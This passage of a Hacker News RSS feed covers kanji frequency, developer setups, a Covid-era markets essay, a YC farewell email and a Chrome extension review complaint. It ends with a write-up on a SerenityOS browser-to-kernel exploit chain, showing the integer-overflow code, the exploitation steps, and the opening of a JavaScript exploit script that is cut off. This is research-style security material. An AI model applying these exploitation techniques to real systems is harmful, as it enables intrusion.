<![CDATA[Ditherpunk 2 ‚Äì beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 181 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Screenshots from Developers: 2002 vs. 2015]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26119769">thread link</a>) | @beliu
<br/>
February 12, 2021 | https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/ | <a href="https://web.archive.org/web/*/https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>How things have (and have not changed). I'm still a command-line junkie with at least two xterm windows open. I'm still using a 3x3 virtual desktop. However, instead of fvwm, it is now LXDE. I've also switched from FreeBSD to Linux and I'm running Lubuntu as my distribution.</p>

<p>There are a lot of indispensable GUI tools that I use. These include Firefox, lyx, Gimp, KeepassX, Shutter, viking, dia, Wireshark, calibre, audacity, Handbrake and VLC. But where possible I still prefer to script things. My main development languages are still shell, Perl and C.</p>

<p>My shell is now bash. The vi keystrokes are burned into my fingertips and, as long as vim can be ported to new systems, that will be my text editor until I pass on. My mail client is now mutt (definitely not a web client) and my mail is stored locally, not on someone else's server.</p>

<p>The only issue I have is that, since a job change, I now have to deal with Windoze things. Thus, I have VirtualBox, libreoffice and Wine to help me do that.</p>

<p>I started with Unix on a Pyramid 90x. I now have a smart phone that blows the 90x out of the water on performance, RAM and storage. But I'm so very happy that, somewhere down underneath, there is still a Bourne shell and an operating system that does open(), close(), read(), write(), fork() and exec()!</p>
</div></div>]]>
            </description>
            <link>https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119769</guid>
            <pubDate>Fri, 12 Feb 2021 23:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calvin and Hobbes Search Engine]]>
            </title>
            <description>
<![CDATA[
Score 450 | Comments 156 (<a href="https://news.ycombinator.com/item?id=26119380">thread link</a>) | @bookofjoe
<br/>
February 12, 2021 | http://michaelyingling.com/random/calvin_and_hobbes/ | <a href="https://web.archive.org/web/*/http://michaelyingling.com/random/calvin_and_hobbes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://michaelyingling.com/random/calvin_and_hobbes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119380</guid>
            <pubDate>Fri, 12 Feb 2021 22:40:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Covid brought the future back]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 69 (<a href="https://news.ycombinator.com/item?id=26116488">thread link</a>) | @furtively
<br/>
February 12, 2021 | https://worksinprogress.co/issue/how-covid-brought-the-future-back/ | <a href="https://web.archive.org/web/*/https://worksinprogress.co/issue/how-covid-brought-the-future-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<p>When the US joined World War Two, it set back a number of peacetime R&amp;D projects. A team at Bell Labs had been studying some interesting properties of semiconducting substances, with the hope that they might find a way to replace the then-ubiquitous vacuum tube. But the exigencies of wartime complicated their plans‚Äîfor one thing, the only supplier of sufficiently pure silicon was a German company‚Äîso they took a break to focus on wartime applications like radar. By the time they returned to regular work, the war was won, the US industrial base had dramatically ramped up (now DuPont, not German suppliers, made the world‚Äôs purest silicon), and the team had acquired an encyclopedic knowledge of how substances like silicon and germanium behave.</p>
<p>Two years later, the transistor was born.</p>
<p>Crises radically reshape priorities; they cancel some projects, and accelerate others. But another effect they have is to make people more conscious of the future. To struggle through a crisis is, implicitly, to view the future as a point very much worth getting to. The Bell Labs team certainly helped build a better postwar future, and arguably Covid-19 has pushed people in the same direction.</p>
<p>We shouldn‚Äôt expect the results of this to be visible just yet. Scientific progress is visible on a lag: while the <i>New York Times</i> did mention the invention of transistors, it was midway through a column called ‚Äúnews of the radio,‚Äù hardly an accurate assessment of the impact of one of the twentieth century‚Äôs great inventions. Fortunately, there are more real-time ways to approximate people‚Äôs attitudes towards the future‚Äîthe stock market is a real-time dollar-weighted poll about what kinds of companies will matter, and how that‚Äôs changing.</p>
<p>One of the surprising consequences of the Covid-19 pandemic was that, after a brief and fearsome decline, overall asset prices rose. That‚Äôs partly an artifact of how policymakers responded to the pandemic; pumping liquidity into the market does help offset supply shocks, and some of that money finds its way into speculative vehicles. But even <i>within</i> the market, there‚Äôs been a striking rise in investor interest in electric vehicles, autonomous cars, AI, and software companies ranging from consumer-facing companies like Facebook and Google to complex enterprise products like Snowflake.</p>
<p>The market‚Äôs judgments always have to be taken judiciously. Humans are imperfect judges of the present, not to mention the future. And as the recent GameStop fireworks demonstrate, sometimes prices can be driven more by technical aspects of market structure than by a cold and calculating assessment of the net present value of future cash flows. Even GameStop‚Äôs run-up, though, was born out of forward-looking analysis of a business, not gambling. The original thesis behind buying GameStop, before it turned into a social movement devoted to punishing hedge funds, <i>was</i> an argument that the company was fundamentally underpriced‚Äîbecause the market had missed its opportunity to transcend brick-and-mortar retailing and digitize its business!</p>
<p>There are definite precedents for extrapolating about new concerns from stock prices. Defense stocks rise when war is rumored to be imminent, for example, and cyclical stocks‚Äô performance tends to change ahead of macro data on the economic cycle. More narrowly, the economist Armen Alchian <a href="https://www.sciencedirect.com/science/article/abs/pii/S0929119914000546">deduced that hydrogen bombs use lithium by tracking the stock prices of mining companies</a>.</p>
<p>Today, the world‚Äôs most valuable automaker is Tesla, with a market capitalization of $827bn, compared to $232bn for runner-up Toyota. Tesla isn‚Äôt valued based on its current production (just under 500,000 vehicles annually, compared to Toyota‚Äôs 9.2 million) or high margins (it eked out a net profit margin of just under 2%, less than half of Toyota‚Äôs results). Instead, Tesla is valued based on three forward-looking intangibles: it‚Äôs a pure-play electric vehicle company, its brand name is synonymous with clean energy rather than the more mixed reaction General Motors or Hyundai might engender, and its charismatic CEO has been able to recruit cult-like adherents to his vision of sustainable transportation and a multiplanetary species.</p>
<p>Calling Tesla is a cult isn‚Äôt pejorative, just descriptive: any organization that successfully accomplishes something that is widely believed to be impossible has to have distinctive beliefs, and any group of people who behave in unusual ways because of shared beliefs can be reasonably described as a cult. Some companies use their cultish aspects in harmful ways, but cults are a social design pattern that shows up over and over again, in successful companies and political movements. Cult-like traits are more common with companies that are growing fast‚Äîit would be hard for a steel mill or a local bank to engender this kind of behavior in its employees. It‚Äôs a way to focus everyone‚Äôs energy on the future, and avoid distracting questions about whether or not that future is viable‚Äîa way to raise the variance of outcomes, which makes extreme upside scenarios possible while increasing the odds of failure.</p>
<p>Tesla is not the only futuristic vehicle stock to be accorded a high value by the stock market. In fact, it‚Äôs arguably among the more mature. There are at least earnings to put a price/earnings multiple on, whereas many of the more recent EV companies are at an earlier stage than that. Luminar Technologies, for example, went public through a reverse merger late last year, and currently has a market value of almost $11bn. The company has minimal sales ($11m over the last nine months) and is still pouring money into R&amp;D. But LiDAR appears to be the most promising way to get cars to full autonomy, so investors are willing to value it based on the chance that a) autonomous vehicles will happen, b) they‚Äôll use LiDAR, c) they‚Äôll use Luminar‚Äôs systems to do it, and d) Luminar will be able to earn acceptable margins selling it.</p>
<p>The joint probability of all of those possibilities is low if they‚Äôre independent: if there‚Äôs a 10% chance of autonomous vehicles, a 10% chance they‚Äôll use LiDAR, a 10% chance that LiDAR-using AVs will use Luminar‚Äôs technology, and a 10% chance that Luminar will get good margins, then the odds of Luminar being a good investment work out to 0.01%. But the more ambitious a company is, the more its job is to make those variables <i>conditional</i> instead: the closer a company gets to being the <i>only</i> way a given technology can happen, the more technology risk becomes synonymous with business risk, which compresses the overall range of outcomes. It also solves for the viable-business condition: if there‚Äôs just one company that can make AVs possible, then that company will have the pricing power necessary to make them profitable, too.</p>
<p>This dynamic actually works in two directions: first, it means that the odds of Luminar selling LiDAR conditional on LiDAR becoming ubiquitous are higher, because the latter is most probably going to happen if the former is true. And second, it‚Äôs a recruiting tool: if there‚Äôs one company that has a reasonable shot at accomplishing something, and it‚Äôs a desirable goal, then the company has a monopoly on the kinds of employees who can achieve that goal. This is a point Peter Thiel articulates in <i>Zero to One</i>, and it‚Äôs one of the reasons technology companies have such a skewed distribution of outcomes. They articulate a variant view, which means they attract people who share that variant view‚Äîand since the argument is settled by technology and economics, they don‚Äôt have to persuade the rest of the world, just to offer a better product.</p>
<p>The rise of special purpose acquisition vehicles, or SPACs, is a general testament to a more forward-looking market. In a conventional IPO, an operating company sells shares to the public; with a SPAC, an empty shell company goes public, and then identifies a private company to merge with. Due to a quirk in securities laws, a traditional IPO prospectus only shows a company‚Äôs backwards-looking estimates, and makes heavily-qualified statements about the future. A company that goes public through a SPAC is technically engaging in a merger, rather than an IPO, and the rules are different. When a public company buys another company, securities laws allow it to talk about that company‚Äôs anticipated growth, or the likely cost savings of the merger. Similarly, SPAC offerings can talk up a company‚Äôs long-term prospects, and even make exact estimates of future revenue.</p>
<p>SPACs have existed for years, but they exploded in popularity in 2020. Of the 466 SPAC companies that went public from 2011 through 2020, 248 of them went public in 2020 alone. A number of technical forces drove this‚Äîa large number of private companies looking for acquisitions, investors eager to get into <i>any</i> growth company early, some technicalities around SPAC issuance that make them attractive to specialist hedge funds. But the key driver of excitement about SPACs is that they can take companies public based on a future-focused outlook.</p>
<p>When Virgin Galactic went public by merging with Chamath Palihapitiya‚Äôs Social Capital Hedosophia Holdings, the company, which has taken deposits but generated minimal revenue, was able to project $590 million in annual revenue in the year 2023, and over a quarter of a billion dollars in pretax, pre-depreciation earnings. While this was optimistic, it‚Äôs also demonstrative: a company like Virgin Galactic would have been almost impossible to take public in a conventional way, because backwards-looking financial statements showed only losses. it may not work out as a business, or live up to its projections, but those projections got more plausible once it had access to public markets for funding.</p>
<p>High valuations for money-losing, often pre-revenue companies remind people of the dot-com bubble, and it‚Äôs worth putting that bubble in perspective. Someone who bought the market at its peak in March 2000 has earned a 6% compounded return since then. ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://worksinprogress.co/issue/how-covid-brought-the-future-back/">https://worksinprogress.co/issue/how-covid-brought-the-future-back/</a></em></p>]]>
            </description>
            <link>https://worksinprogress.co/issue/how-covid-brought-the-future-back/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116488</guid>
            <pubDate>Fri, 12 Feb 2021 17:58:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye YC]]>
            </title>
            <description>
<![CDATA[
Score 277 | Comments 40 (<a href="https://news.ycombinator.com/item?id=26116420">thread link</a>) | @awaxman11
<br/>
February 12, 2021 | https://blog.aaronkharris.com/goodbye-yc | <a href="https://web.archive.org/web/*/https://blog.aaronkharris.com/goodbye-yc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <div><p><i>I sent this email to the whole team at YC yesterday:</i></p><p>When I joined&nbsp;YC&nbsp;7.5 years ago, there weren‚Äôt many people around. PG and Jessica were still running things. We had offices in Mountain View, Palo Alto, and on Kearny street, but they were nearly always empty. The only meeting on any calendar was the lunch on Thursdays where we‚Äôd talk about companies over takeout or at a table in a crowded restaurant.</p><p>The ways in which we‚Äôve changed since then have been amazing to see.&nbsp;YC&nbsp;has grown in every way imaginable. The scope of what&nbsp;YC&nbsp;funds is larger. The team is bigger and more capable. The number of companies is pushing towards some ever receding upper bound. There‚Äôs more software, a larger community, and more programming designed to help&nbsp;YC&nbsp;founders build better futures.</p><p>I feel a deep sense of pride and honor at the part that I‚Äôve played in that change and growth. I recall the first conversation I had with Aaron King about the Series A for Snapdocs. The questions he and I worked through were the kernel of the Series A program. I am amazed to see the directions in which Janelle is now building YCA. I‚Äôm grateful for the part I played in our conversations about growing beyond seed investing - conversations which eventually took shape as YCC. And, of course, there are fifteen batches worth of applications, interviews, dinners, office hours, and demo days rattling around in my head.<br></p><p>I‚Äôve been thinking, recently, about the founders with whom I‚Äôve had a chance to work. I‚Äôve lost count of the number of incredible people I‚Äôve gotten to know over these last years. Thinking back, it‚Äôs easy to see how the sheer weight of numbers can drive a person to be jaded about the problems that founders face. But the other night, as I spoke with a founder about a tough situation, I was reminded about how important it is to that individual that she gets the best possible advice. This is a lesson I learned time and again, and is something I hope I‚Äôll never forget.</p><p>And then there‚Äôs the funny stuff. There were stolen air conditioners, barefoot pitches, robots that did not make sandwiches, update emails pulled from the I Ching, bandages, inhaled jet fuel, and literal blood on the interview floors. These are the things that I‚Äôll remember long after everything else.</p><p>The truth is, I only meant to stick around&nbsp;YC&nbsp;for two years. Somehow, that two became two more, and then some more. As meaningfully as I‚Äôve enjoyed my work here, it‚Äôs time for me to move onto something different and new and outside the bounds of what&nbsp;YC&nbsp;does. That‚Äôs a strange, exhilarating moment, and an important one for me and for my family. The pandemic provided the practical and existential nudge I needed to see the depth of this need.</p><p>To my fellow partners - thank you for your tireless work for our founders and for&nbsp;YC. Thank you for everything you‚Äôve taught me, for all the strange conversations we‚Äôve had, and for all the demo day presentations we‚Äôve crafted.</p><p>To PG and Jessica and Trevor and RTM - thank you for giving me this opportunity and for making&nbsp;YC&nbsp;the kind of place I could love enough to stay long after I meant to leave.</p><p>To Janelle - thank you for building YCA with me and for being the best person I could imagine to take it into the future.</p><p>To everyone else -&nbsp;YC‚Äôs mission in the world is abstract. It could mean so many things, but it wouldn‚Äôt be anything without your work. Whether you are managing founder expectations about housing in the Bay Area, helping someone understand the mysteries of cap tables, talking someone down off the ledge of yelling at a reporter, or making sure that there will one day be an office to come back to, you are what makes&nbsp;YC&nbsp;a viable, vital force in the world.</p><p>I‚Äôve never liked&nbsp;goodbye.</p><p>aaron</p></div>
    
  </div></div>]]>
            </description>
            <link>https://blog.aaronkharris.com/goodbye-yc</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116420</guid>
            <pubDate>Fri, 12 Feb 2021 17:54:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It's time to port your extension to Firefox]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 34 (<a href="https://news.ycombinator.com/item?id=26116105">thread link</a>) | @DanielDe
<br/>
February 12, 2021 | https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox | <a href="https://web.archive.org/web/*/https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        
        <h4>February 12th, 2021 ¬∑ 5 minute read</h4>

        <p>
          I've seen quite a <a href="https://news.ycombinator.com/item?id=21990566">few</a> <a href="https://blog.pushbullet.com/2020/05/13/lets-guess-what-google-requires-in-14-days-or-they-kill-our-extension/">people</a> <a href="https://blog.lipsurf.com/part-ii-after-3-years-of-work-chrome-killed-my-extension-and-wont-tell-me-why/">complaining</a> lately about the Kafkaesque Chrome extension review process, so when I started running into my own problems with the Chrome Web Store I wasn't exactly surprised.
        </p>

        <p>
          It wasn‚Äôt until I submitted the same extension to the Firefox Add-Ons Store that I saw just how good things could be. In a world of walled gardens watched over by heavy handed reviewers, Firefox's review process was laughably good.
        </p>

        <section>
          

          <p>
            In January 2020 my buddy and I started working on an idea we had for an automation app. We called it Otto.
          </p>

          <p>
            Otto consisted of two parts: a Mac app and a browser extension. After a few months worth of nights and weekends we had an alpha version we were ready to share with friends. I submitted the browser extension to Chrome under my own personal account, and after a review process of a couple days it was accepted. So far so good.
          </p>
        </section>

        <section>
          

          <p>
            The trouble started a few months later. After some more development and discussion, we re-framed our idea as an app to make custom keyboard shortcuts and we decided to rename Otto to <a href="https://keysmith.app/">Keysmith</a>. We also took the time at this point to create a company Google account. We renamed the extension and submitted it from our new company account.
          </p>

          <p>
            To be clear: changing the name was the <i>only</i> change we made.
          </p>

          <p>
            A few days later we received a rejection email. Here's a timeline of our interaction:
          </p>

          <div>
            
            <p>
                We submit Keysmith to the Chrome Web Store.
              </p>
          </div>

          <div>
            
            <div>
              <p>
                First rejection email.

                Quick summary:
              </p>

              <ul>
                <li>Keysmith "violates the 'Use of Permissions' section"</li>
                <li>We should "Request access to the narrowest permissions necessary"</li>
                <li>"If more than one permission could be used to implement a feature, you must request those with the least access to data or functionality."</li>
                <li>We shouldn't attempt to "future proof"</li>
              </ul>
            </div>
          </div>

          <div>
            
            <div>
              <div><p>
                We double check the permissions we've requested and can't find any problems. We respond asking for more detail.
                </p><p>
                We also mention that we had previously submitted the <i>same</i> extension with the <i>same</i> requested permissions, just under a different name (Otto). We hoped they'd say "oh, in that case we'll approve this right away!". But instead:
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                Otto, our <i>existing extension</i>, is removed from the store and no additional detail on the rejection is provided. In fact, this email contains the <i>same exact</i> text as the previous one.
              </p>
          </div>

          <div>
            
            <p>
                We respond, again asking for more detail. We ask if it would help if we expanded on how we're using each permission in the permissions justification section.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the <i>exact same text again</i>. No further detail. No help at all.
              </p>
          </div>

          <div>
            
            <p>
                We suspect these reviews are entirely automated, so we ask if we can speak to a "human reviewer", hoping this will trigger a manual review (we also consider dropping an f-bomb for the same reason, but decide to remain decent for now).
              </p>
          </div>

          <div>
            
            <p>
                They respond with some <i>slightly</i> different text, but still nothing useful.
              </p>
          </div>

          <div>
            
            <p>
                We try adding a lot more detail to the "justification" section for each of the permissions we use and we resubmit.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the exact same text as the first rejection.
              </p>
          </div>

          <div>
            
            <p>
                We respond with one more plea for more more information.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the same text again.
              </p>
          </div>
        </section>

        <section>
          

          <p>
            At this point I dig into Chrome's documentation once again with a fine-tooth comb and I make a discovery: we had been requesting both the <span>tabs</span> and <span>activeTab</span> permissions, but since we also requested permission to run on <span>&lt;all_urls&gt;</span> it turns out that the features made available by <span>activeTab</span> were a strict subset of the features made available by <span>tabs</span>. So the <span>activeTab</span> permission was redundant. We weren't opening up any new functionality, we were just asking for a <i>redundant</i> permission.
          </p>

          <p>
            This discovery made the Chrome review team's communications far more frustrating in retrospect. The line that all of their emails repeated was "Request access to the narrowest permissions necessary". And, sure, we had asked for <span>activeTab</span> when we didn't need it, but that permission <i>didn't grant us any more functionality</i>. They had rejected our extension 6 times with no detail <i>because of a technicality</i>.
          </p>

          <p>
            We committed the 1 line diff removing the <span>activeTab</span> permission and resubmitted. A day later it was accepted.
          </p>
        </section>

        <section>
          

          <p>
            A Firefox version of our browser extension had long been on our list, but for the first little while it didn't feel worth the additional support cost. We didn't know exactly how large that cost would be, but we suspected that there would be enough differences between the two browsers that it'd be a bit of a hassle to maintain them both.
          </p>

          <p>
            Boy were we wrong. When we finally started looking into porting our extension to Firefox we found that we had to make <i>zero</i> changes to the code. None whatsoever. Firefox even supported the use of the global <span>chrome</span> object for accessing extension APIs (if you're curious, Chrome is not kind enough to return the favor).
          </p>

          <p>
            So we created a Firefox developer account, submitted our extension, and girded ourselves for another rough ride.
          </p>

          <p>
            <i>Boy were we wrong.</i>
          </p>

          <div>
            
            <p>
                We submit the first version of our extension to Firefox.
              </p>
          </div>

          <div>
            
            <div>
              <div><p>
                Less than 3 hours later we receive an email from Firefox that says, in effect, "Sorry this is taking so long, but we'll get to it soon!"
                </p><p>
                Responses from the Chrome team usually came in the wee hours of the morning, making the effective turnaround about 24 hours. Firefox apologizing after fewer than 3 hours was <i>hilarious</i> to us.
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                We get an email saying the extension was accepted exactly 24 hours after submission.
              </p>
          </div>

          <p>
            Further updates have been even speedier, usually only taking 2 or 3 minutes to be scanned and accepted. One of our updates even got accepted before I finished uploading the unminified source archive (which they require if you minify in production). And the dashboard shows your position in the review queue to give you some idea of when it'll complete.
          </p>

          <p>
            Needless to say, this was a breath of fresh air, and we won't be neglecting support for Firefox ever again in the future.
          </p>
        </section>

        <section>
          

          <p>
            I realize that in some ways this is an unfair comparison. Chrome's market share is much larger than Firefox's these days, so surely they also have to deal with far more extension submissions.
          </p>

          <p>
            But the lack of transparency in their process was infuriating and counter-productive. Had someone taken the time to manually review our case, or at least <i>read any of the emails</i> we sent, we could've resolved this issue with one response. Instead it took 6 responses and a week of wondering if this review process would kill our product before it even launched.
          </p>

          <p>
            I really hope things improve, but I'm not counting on it.
          </p>

        </section>

        <hr>

        
      </div>
    </div></div>]]>
            </description>
            <link>https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116105</guid>
            <pubDate>Fri, 12 Feb 2021 17:27:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ghost in the MP3 (2014)]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 64 (<a href="https://news.ycombinator.com/item?id=26116062">thread link</a>) | @Tomte
<br/>
February 12, 2021 | http://theghostinthemp3.com/theghostinthemp3.html | <a href="https://web.archive.org/web/*/http://theghostinthemp3.com/theghostinthemp3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://theghostinthemp3.com/theghostinthemp3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116062</guid>
            <pubDate>Fri, 12 Feb 2021 17:24:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS: Writing a Full Chain Exploit]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26115141">thread link</a>) | @ingve
<br/>
February 12, 2021 | https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html | <a href="https://web.archive.org/web/*/https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p>I recently came across <a href="https://github.com/SerenityOS/serenity">SerenityOS</a> when it was featured in hxp CTF and then on <a href="https://twitter.com/liveoverflow">LiveOverflow‚Äôs</a> YouTube channel. SerenityOS is an open source operating system written from scratch by <a href="https://twitter.com/awesomekling">Andreas Kling</a> and now has a strong and active community behind it. If you‚Äôd like to learn a bit more about it then the recent <a href="https://cppcast.com/serenity-os/">CppCast episode</a> is a good place to start, as well as all of the <a href="https://www.youtube.com/andreaskling">fantastic videos by Andreas Kling</a>.</p>

<p>Two of the recent videos were about writing exploits for a <a href="https://www.youtube.com/watch?v=LMvjaoBLPxA">typed array bug in javascript</a>, and a <a href="https://www.youtube.com/watch?v=gt6-TC6FtMs">kernel bug in munmap</a>. The videos were great to watch and got me thinking that it would be fun to try and find a couple of bugs that could be chained together to create a full chain exploit such as exploiting a browser bug to exploit a kernel bug to get root access.</p>

<h3 id="entrypoint">Entrypoint</h3>

<p>I started looking around and discovered an integer overflow when creating a typed array from an array buffer, the length was multiplied by the element size which could overflow.
<a href="https://github.com/SerenityOS/serenity/blob/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b/Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69">Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69</a></p>

<div><div><pre><code><span>static</span> <span>void</span> <span>initialize_typed_array_from_array_buffer</span><span>(</span><span>GlobalObject</span><span>&amp;</span> <span>global_object</span><span>,</span> <span>TypedArrayBase</span><span>&amp;</span> <span>typed_array</span><span>,</span> <span>ArrayBuffer</span><span>&amp;</span> <span>array_buffer</span><span>,</span> <span>Value</span> <span>byte_offset</span><span>,</span> <span>Value</span> <span>length</span><span>)</span>
<span>{</span>
    <span>// SNIP ...</span>

    <span>auto</span> <span>buffer_byte_length</span> <span>=</span> <span>array_buffer</span><span>.</span><span>byte_length</span><span>();</span>
    <span>size_t</span> <span>new_byte_length</span><span>;</span>
    <span>if</span> <span>(</span><span>length</span><span>.</span><span>is_undefined</span><span>())</span> <span>{</span>
        <span>if</span> <span>(</span><span>buffer_byte_length</span> <span>%</span> <span>element_size</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayInvalidBufferLength</span><span>,</span> <span>typed_array</span><span>.</span><span>class_name</span><span>(),</span> <span>element_size</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span><span>offset</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffset</span><span>,</span> <span>offset</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>new_byte_length</span> <span>=</span> <span>buffer_byte_length</span> <span>-</span> <span>offset</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>new_byte_length</span> <span>=</span> <span>new_length</span> <span>*</span> <span>element_size</span><span>;</span>
        <span>if</span> <span>(</span><span>offset</span> <span>+</span> <span>new_byte_length</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffsetOrLength</span><span>,</span> <span>offset</span><span>,</span> <span>offset</span> <span>+</span> <span>new_byte_length</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
    <span>}</span>
    <span>typed_array</span><span>.</span><span>set_viewed_array_buffer</span><span>(</span><span>&amp;</span><span>array_buffer</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_length</span><span>(</span><span>new_byte_length</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_offset</span><span>(</span><span>offset</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_array_length</span><span>(</span><span>new_byte_length</span> <span>/</span> <span>element_size</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This could be used to create two powerful primitives, one that could read an arbitrary address and the other that could read an arbitrary amount from some allocated memory. These were the same primitives that Kling created in his video which meant that the issue could be exploited in exactly the same way:</p>

<ul>
  <li>Finding a vtable pointer with the offset primitive by spraying lots of Numbers</li>
  <li>Use the deterministic memory layout to calculating the stack location</li>
  <li>Find the saved return address on the stack</li>
  <li>Overwriting it with a rop chain.</li>
</ul>

<p>While I was looking into exploiting this, someone else spotted the same issue and it was quickly patched.</p>

<p><a href="https://github.com/SerenityOS/serenity/commit/f6c6047e49f1517778f5565681fb64750b14bf60"><img src="https://devcraft.io/assets/serenity/slack.jpg" alt="slack"></a></p>

<p>As I had already started and wanted to keep using the same issue, I kept working from <a href="https://github.com/SerenityOS/serenity/commit/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b">this commit</a> which still had the bug :)</p>

<p>Exploiting the issue is pretty much identical to the video above and it does a great job explaining what is going on, so I wont go into too much detail. Here Is what I ended up with:</p>

<div><div><pre><code><span>&lt;script&gt;</span>
  <span>function</span> <span>log</span><span>(</span><span>msg</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>msg</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>starting hax</span><span>"</span><span>);</span>

  <span>const</span> <span>AAAs</span> <span>=</span> <span>2261634.509804</span><span>;</span>
  <span>const</span> <span>spray_size</span> <span>=</span> <span>2000</span><span>;</span>
  <span>const</span> <span>spray</span> <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>spray_size</span><span>);</span>

